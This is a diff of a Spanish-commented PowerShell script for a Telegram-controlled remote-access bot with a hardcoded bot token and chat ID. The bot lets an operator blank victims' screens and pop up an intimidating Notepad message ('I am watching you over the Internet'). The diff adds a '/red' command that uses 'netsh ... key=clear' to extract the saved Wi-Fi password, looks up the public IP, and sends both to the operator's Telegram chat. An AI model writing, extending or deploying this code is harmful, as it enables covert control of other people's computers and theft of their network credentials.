@@ -5,10 +5,15 @@ $Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg" # REEMPLAZA CON TU TO
 $ChatID = "1018796719"                                    # REEMPLAZA CON TU CHAT ID REAL COMPLETO
 
 # Construcción de URL fija ultra-estable que acabamos de validar
-$URL    = "https://telegram.org" + $Token
+$URL    = "https://api.telegram.org/bot" + $Token
 $MiPC   = $env:COMPUTERNAME
 $User   = $env:USERNAME
-
+# ==============================================================================
+# NO BORRAR #############################################################
+# ==============================================================================
+# ==============================================================================
+# CONFIGURACIÓN DEL BOT DE TELEGRAM 
+# ==============================================================================
 # Registrar APIs de pantalla de Windows de forma segura
 try {
     $MethodDefinition = '[DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);'
@@ -43,7 +48,7 @@ while ($true) {
     try {
         $Updates = Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=15" -Method Get
         
-        foreach ($Update in $Updates.result) {
+                foreach ($Update in $Updates.result) {
             $LastUpdateID = $Update.update_id + 1
             $TextoRecibido = $Update.message.text
             $RemitenteChatID = $Update.message.chat.id
@@ -53,10 +58,11 @@ while ($true) {
                 # 1. Separar el texto por espacios de forma estricta
                 $Partes = $TextoRecibido -split " "
                 
-                # SOLUCIONADO: Índices restaurados explícitamente para evitar caídas
+                # OBLIGATORIO: Extraer solo la primera palabra (El comando) usando [0]
                 $Comando = [string]$Partes[0]
                 $Comando = $Comando.ToLower()
                 
+                # OBLIGATORIO: Extraer la segunda palabra (El ID de la PC) usando [1]
                 $IDDestino = ""
                 if ($Partes.Count -gt 1) {
                     $IDDestino = [string]$Partes[1]
@@ -67,6 +73,7 @@ while ($true) {
                 $HashBytes = $Md5.ComputeHash([System.Text.Encoding]::ASCII.GetBytes($MiPC))
                 $IdUnico = ([BitConverter]::ToUInt16($HashBytes, 0) % 900) + 100
                 $MiIDNum = [string]$IdUnico
+
 
                 # --- COMANDO GLOBAL: /lista ---
                 if ($Comando -eq "/lista") {
@@ -84,9 +91,8 @@ while ($true) {
                                   "Comandos Individuales (Deja un espacio y pon el numero de la PC):`n" +
                                   "• /pantalla_off [Numero]`n" +
                                   "• /pantalla_on [Numero]`n" +
-                                  "• /notepad [Numero]`n" +
-                                  "• /note [Numero] [Mensaje personalizado]`n`n" +
-                                  "Ejemplo de uso: /note " + $MiIDNum + " hola como estas"
+                                  "• /notepad [Numero]`n`n" +
+                                  "Ejemplo de uso: /notepad " + $MiIDNum
                     
                     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
                     continue
@@ -95,7 +101,7 @@ while ($true) {
                 # VALIDACIÓN CRÍTICA: Solo ejecuta si el número coincide con el de esta máquina
                 if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
                  
-                    switch ($Comando) {
+                 switch ($Comando) {
                  
                         "/pantalla_off" {
                             $rundll = New-Object -ComObject WScript.Shell
@@ -118,32 +124,65 @@ while ($true) {
                             $wsh = New-Object -ComObject WScript.Shell
                             $wsh.SendKeys("Te estoy observando por Internet... 👀")
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
-                            continue 
+                            continue # 👈 CORREGIDO: Esto evita que se choque con el comando /red
                         }
+                        
+                                                                         "/red" {
+                            # 1. Detectar la placa de red real con conexion activa
+                            $RutaActiva = Get-NetRoute -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue | Select-Object -First 1
+                            
+                            $NombreInterfaz = "No detectada"
+                            $IpPrivada = "No detectada"
+                            $NombreWiFi = "No conectado (Es cable Ethernet)"
+                            $ClaveWiFi = "No aplica"
 
-                        "/note" {
-                            # Junta todas las palabras desde la posición 2 en adelante
-                            $MensajePersonalizado = ($Partes[2..($Partes.Count - 1)]) -join " "
-
-                            if ($null -ne $MensajePersonalizado -and $MensajePersonalizado -trim() -ne "") {
-                                Start-Process "notepad.exe"
-                                Start-Sleep -Milliseconds 500
+                            if ($RutaActiva) {
+                                $NombreInterfaz = $RutaActiva.InterfaceAlias
+                                $IpPrivada = (Get-NetIPAddress -InterfaceIndex $RutaActiva.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue).IPAddress
                                 
-                                # Copiar y pegar el texto personalizado de forma limpia
-                                Set-Clipboard -Value $MensajePersonalizado
-                                $wsh = New-Object -ComObject WScript.Shell
-                                $wsh.SendKeys("^v")
-                                
-                                $Respuesta = "Bloc de notas abierto con tu mensaje en ID $MiIDNum"
-                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
+                                # 2. Si esta usando Wi-Fi, extraer el nombre de la red y su contraseña
+                                if ($NombreInterfaz -like "*Wi-Fi*" -or $NombreInterfaz -like "*Wireless*") {
+                                    # Obtiene el nombre del perfil de red activo
+                                    $Perfil = (netsh wlan show interfaces | Select-String -Pattern "^\s+SSID\s+:\s+(.+)$")
+                                    if ($Perfil) {
+                                        $NombreWiFi = $Perfil.Matches.Groups[1].Value.Trim()
+                                        
+                                        # Comando nativo para revelar la clave guardada de ese perfil específico
+                                        $XmlInfo = (netsh wlan show profile name="$NombreWiFi" key=clear | Select-String -Pattern "Contenido de la clave\s+:\s+(.+)$")
+                                        if ($XmlInfo) {
+                                            $ClaveWiFi = $XmlInfo.Matches.Groups[1].Value.Trim()
+                                        } else {
+                                            $ClaveWiFi = "No encontrada o red abierta"
+                                        }
+                                    }
+                                }
                             }
+
+                            # 3. Obtener la IP Publica
+                            $IpPublica = "Desconocida"
+                            try {
+                                $IpPublica = (Invoke-RestMethod -Uri "https://icanhazip.com" -TimeoutSec 5).Trim()
+                            } catch {}
+
+                            # 4. Armar el reporte de texto plano seguro
+                            $ReporteRed = "REPORTE DE RED (ID: $MiIDNum)`nAdaptador: $NombreInterfaz`nNombre Wi-Fi: $NombreWiFi`nClave Wi-Fi: $ClaveWiFi`nIP Privada: $IpPrivada`nIP Publica: $IpPublica"
+                                          
+                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $ReporteRed })
                             continue
                         }
-                    } # Cierre del switch
-                } # Cierre del if de VALIDACIÓN DE ID
-            } # Cierre del if de REMITENTE
-        } # Cierre del foreach
+
+
+
+
+
+
+                    } # Cierre limpio del switch
+                }
+            }
+        }
     } catch {
-        Start-Sleep -Seconds 2
-    } # Cierre del catch
-} # Cierre del while
+        Start-Sleep -Seconds 3
+    }
+    Start-Sleep -Seconds 2
+}
+
